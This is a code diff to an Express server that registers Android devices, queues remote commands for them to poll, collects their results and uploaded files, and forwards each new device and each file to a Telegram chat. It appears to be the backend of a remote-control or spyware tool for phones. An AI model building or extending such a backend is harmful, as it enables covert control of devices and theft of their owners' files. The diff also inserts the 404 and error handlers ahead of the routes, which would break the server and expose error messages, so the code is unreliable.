@@ -120,6 +120,16 @@ app.use(helmet());
 app.use(compression());
 app.use(express.json({ limit: '100mb' }));
 app.use(express.urlencoded({ extended: true, limit: '100mb' }));
+// Add before your routes
+app.use((err, req, res, next) => {
+    console.error('Server error:', err.stack);
+    res.status(500).json({ error: 'Internal server error', message: err.message });
+});
+
+// Add 404 handler
+app.use((req, res) => {
+    res.status(404).json({ error: 'Endpoint not found' });
+});
 
 // Rate limiting
 const limiter = rateLimit({
@@ -1459,54 +1469,138 @@ app.get('/health', (req, res) => {
     });
 });
 
-// Device registration (HTTP fallback)
+// Device registration endpoint (called by Android app)
+
 app.post('/api/register', (req, res) => {
-    const { deviceId, deviceInfo } = req.body;
+    const { deviceId, chatId, deviceInfo } = req.body;
 
     if (!deviceId) {
         return res.status(400).json({ error: 'Missing deviceId' });
     }
 
-    // Register in memory (WebSocket will handle full registration)
+    // Generate device key
     const deviceKey = encryption.generateDeviceKey();
     
-    res.json({
-        status: 'registered',
-        deviceId,
-        key: deviceKey,
-        serverTime: Date.now()
-    });
+    // Store in database
+    db.run(`INSERT OR REPLACE INTO devices 
+        (id, model, android_version, manufacturer, chat_id, registered_at, last_seen, battery_level, encryption_key, features) 
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+        [
+            deviceId,
+            deviceInfo?.model || 'Unknown',
+            deviceInfo?.android || 'Unknown',
+            deviceInfo?.manufacturer || 'Unknown',
+            chatId || config.telegram.chatId,
+            Date.now(),
+            Date.now(),
+            deviceInfo?.battery || 100,
+            deviceKey,
+            JSON.stringify(deviceInfo?.features || [])
+        ],
+        function(err) {
+            if (err) {
+                console.error('Database error:', err);
+                return res.status(500).json({ error: 'Database error' });
+            }
+            
+            console.log(`✅ Device registered: ${deviceId} (${deviceInfo?.model || 'Unknown'})`);
+            
+            // Send Telegram notification
+            sendTelegramMessage(config.telegram.chatId, 
+                `✅ *New Device Registered*\nModel: ${deviceInfo?.model || 'Unknown'}\nAndroid: ${deviceInfo?.android || 'Unknown'}`);
+            
+            res.json({
+                success: true,
+                deviceId,
+                key: deviceKey,
+                serverTime: Date.now()
+            });
+        }
+    );
 });
 
-// Command polling
+// Add ping endpoint for keep-alive
+app.get('/api/ping/:deviceId', (req, res) => {
+    const { deviceId } = req.params;
+    
+    db.run(`UPDATE devices SET last_seen = ? WHERE id = ?`, 
+        [Date.now(), deviceId], 
+        function(err) {
+            if (err) {
+                console.error('Ping error:', err);
+                return res.status(500).json({ error: 'Database error' });
+            }
+            
+            if (this.changes === 0) {
+                return res.status(404).json({ error: 'Device not found' });
+            }
+            
+            res.json({ 
+                success: true, 
+                timestamp: Date.now() 
+            });
+        }
+    );
+});
+
+// Get commands for device (polling endpoint)
 app.get('/api/commands/:deviceId', (req, res) => {
     const { deviceId } = req.params;
-    const device = deviceManager.devices.get(deviceId);
     
-    if (device?.pendingCommands?.length > 0) {
-        const commands = [...device.pendingCommands];
-        device.pendingCommands = [];
-        res.json({ commands });
-    } else {
-        res.json({ commands: [] });
-    }
+    db.all(`SELECT id, command, parameters FROM commands 
+            WHERE device_id = ? AND status = 'sent' 
+            ORDER BY created_at ASC LIMIT 10`, 
+        [deviceId], 
+        (err, rows) => {
+            if (err) {
+                console.error('Command query error:', err);
+                return res.status(500).json({ error: 'Database error' });
+            }
+            
+            // Mark commands as delivered
+            if (rows && rows.length > 0) {
+                const ids = rows.map(r => r.id);
+                db.run(`UPDATE commands SET status = 'delivered' 
+                        WHERE id IN (${ids.map(() => '?').join(',')})`, ids);
+            }
+            
+            res.json({ 
+                commands: rows || [],
+                timestamp: Date.now()
+            });
+        }
+    );
 });
 
-// Command result
+// Submit command result
 app.post('/api/result/:deviceId', (req, res) => {
     const { deviceId } = req.params;
     const { commandId, success, data, error } = req.body;
-
-    // Forward to WebSocket handler
-    handleDeviceResponse(deviceId, { commandId, success, data, error });
     
-    res.sendStatus(200);
+    db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? 
+            WHERE id = ?`,
+        [success ? 'completed' : 'failed', 
+         JSON.stringify(data || error || {}), 
+         Date.now(), 
+         commandId],
+        function(err) {
+            if (err) {
+                console.error('Result update error:', err);
+                return res.status(500).json({ error: 'Database error' });
+            }
+            
+            res.json({ success: true });
+        }
+    );
 });
 
-// File upload
-app.post('/api/upload', multer({ dest: 'uploads/' }).single('file'), async (req, res) => {
+// File upload endpoint
+app.post('/api/upload-file', multer({ 
+    dest: 'uploads/',
+    limits: { fileSize: config.storage.maxFileSize }
+}).single('file'), async (req, res) => {
     try {
-        const { deviceId, type, caption } = req.body;
+        const { deviceId, fileType, caption, filename } = req.body;
         const file = req.file;
 
         if (!deviceId || !file) {
@@ -1514,24 +1608,36 @@ app.post('/api/upload', multer({ dest: 'uploads/' }).single('file'), async (req,
         }
 
         const mediaId = uuidv4();
-        const fileExt = path.extname(file.originalname);
+        const fileExt = path.extname(filename || file.originalname);
         const newPath = path.join('uploads', `${mediaId}${fileExt}`);
 
         fs.renameSync(file.path, newPath);
 
-        db.run(`INSERT INTO media (id, device_id, type, file_path, size, timestamp)
-            VALUES (?, ?, ?, ?, ?, ?)`,
-            [mediaId, deviceId, type, newPath, file.size, Date.now()]
+        db.run(`INSERT INTO media (id, device_id, type, file_path, size, timestamp, metadata)
+            VALUES (?, ?, ?, ?, ?, ?, ?)`,
+            [mediaId, deviceId, fileType || 'unknown', newPath, file.size, Date.now(), 
+             JSON.stringify({ caption, filename })],
+            async function(err) {
+                if (err) {
+                    console.error('Media insert error:', err);
+                    return res.status(500).json({ error: 'Database error' });
+                }
+                
+                // Get device info and send to Telegram
+                db.get('SELECT * FROM devices WHERE id = ?', [deviceId], async (err, device) => {
+                    if (!err && device) {
+                        await sendTelegramDocument(
+                            config.telegram.chatId, 
+                            newPath, 
+                            filename || file.originalname,
+                            `${caption || '📎 File'} from ${device.model || 'Device'}`
+                        );
+                    }
+                });
+                
+                res.json({ success: true, mediaId });
+            }
         );
-
-        // Forward to Telegram
-        const device = deviceManager.devices.get(deviceId);
-        if (device) {
-            await sendTelegramDocument(config.telegram.chatId, newPath, file.originalname, 
-                `${caption || '📎 File'} from ${device.info.model}`);
-        }
-
-        res.json({ success: true, mediaId });
 
     } catch (error) {
         console.error('Upload error:', error);
